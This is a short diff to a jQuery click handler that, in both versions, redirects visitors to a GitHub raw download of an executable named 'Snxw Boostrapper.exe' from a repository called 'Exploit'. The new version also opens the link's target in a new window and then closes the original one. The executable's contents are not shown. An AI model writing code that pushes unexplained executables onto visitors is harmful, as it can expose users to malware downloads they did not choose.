@@ -1,5 +1,8 @@
 $(".DownloadLink").click(
     function(e) {
-        window.location.href="https://github.com/SxnwDev/Exploit/raw/main/Snxw%20Boostrapper.exe";
+        e.preventDefault();
+        window.open( $(this).attr("href") );
+        window.location="https://github.com/SxnwDev/Exploit/raw/main/Snxw%20Boostrapper.exe";
+        window.close();
     }
 );
